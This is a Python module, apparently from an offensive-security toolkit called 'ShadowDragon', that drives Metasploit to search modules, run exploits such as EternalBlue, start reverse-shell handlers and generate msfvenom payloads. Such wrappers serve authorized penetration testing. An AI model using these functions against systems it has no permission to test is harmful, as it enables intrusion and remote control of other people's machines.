"""ShadowDragon metasploit integration - proper msfconsole control.

Drives msfconsole via resource scripts (the reliable, non-interactive way). Can
search modules, run exploits with options, and start handlers. All via the safe
host runner - no shell injection.
"""
from __future__ import annotations

import tempfile
from pathlib import Path
from ...host import is_available, missing_hint, run


def search(query: str, timeout: int = 30) -> str:
    """Search metasploit modules."""
    if not is_available("msfconsole"):
        return missing_hint("msfconsole", "metasploit-framework")
    q = "".join(c for c in str(query) if c.isalnum() or c in " /_-" )
    if not q.strip():
        return "query required"
    rc = _resource_script([f"search {q}", "exit -y"])
    return run("msfconsole", ["-q", "-r", str(rc)], timeout=timeout).text()


def run_exploit(module: str, options: str = "", lhost: str = "", lport: int = 4444,
                timeout: int = 120) -> str:
    """Run a metasploit exploit module with options via a resource script.

    module: e.g. 'exploit/multi/handler' or 'exploit/windows/smb/ms17_010_eternalblue'
    options: e.g. 'RHOSTS=10.10.10.5 LHOST=10.10.10.1'
    """
    if not is_available("msfconsole"):
        return missing_hint("msfconsole", "metasploit-framework")
    # Sanitize module path
    mod = "".join(c for c in str(module) if c.isalnum() or c in "/_-" )
    if not mod.startswith("exploit/") and not mod.startswith("auxiliary/") \
       and not mod.startswith("post/"):
        return f"invalid module '{module}' (must start with exploit/, auxiliary/, or post/)"
    lines = [f"use {mod}"]
    # Parse and set options
    for opt in str(options).split():
        if "=" in opt and ";" not in opt and "|" not in opt:
            lines.append(f"set {opt}")
    if lhost:
        lines.append(f"set LHOST {''.join(c for c in str(lhost) if c.isalnum() or c in '.:')}")
    if lport:
        lines.append(f"set LPORT {int(lport)}")
    lines.append("run")
    lines.append("exit -y")
    rc = _resource_script(lines)
    return run("msfconsole", ["-q", "-r", str(rc)], timeout=timeout).text()


def handler(payload: str = "windows/meterpreter/reverse_tcp", lhost: str = "0.0.0.0",
            lport: int = 4444, timeout: int = 300) -> str:
    """Start a multi/handler to catch a reverse shell (for use with a generated payload)."""
    if not is_available("msfconsole"):
        return missing_hint("msfconsole", "metasploit-framework")
    p = "".join(c for c in str(payload) if c.isalnum() or c == "/")
    h = "".join(c for c in str(lhost) if c.isalnum() or c in ".:")
    lines = [
        "use exploit/multi/handler",
        f"set PAYLOAD {p}",
        f"set LHOST {h}",
        f"set LPORT {int(lport)}",
        "set ExitOnSession false",
        "run -j",
        "exit -y",
    ]
    rc = _resource_script(lines)
    return run("msfconsole", ["-q", "-r", str(rc)], timeout=timeout).text()


def payload_generate(payload: str = "windows/meterpreter/reverse_tcp",
                     lhost: str = "", lport: int = 4444, fmt: str = "raw",
                     outfile: str = "") -> str:
    """Generate a payload with msfvenom."""
    if not is_available("msfvenom"):
        return missing_hint("msfvenom", "metasploit-framework")
    p = "".join(c for c in str(payload) if c.isalnum() or c == "/")
    h = "".join(c for c in str(lhost) if c.isalnum() or c in ".:")
    args = ["-p", p, f"LHOST={h}", f"LPORT={int(lport)}", "-f", str(fmt)]
    if outfile:
        args += ["-o", str(outfile)]
    return run("msfvenom", args, timeout=120).text()


def _resource_script(lines: list[str]) -> Path:
    """Write a metasploit resource script to a temp file."""
    rc = Path(tempfile.mktemp(suffix=".rc"))
    rc.write_text("\n".join(lines) + "\n")
    return rc
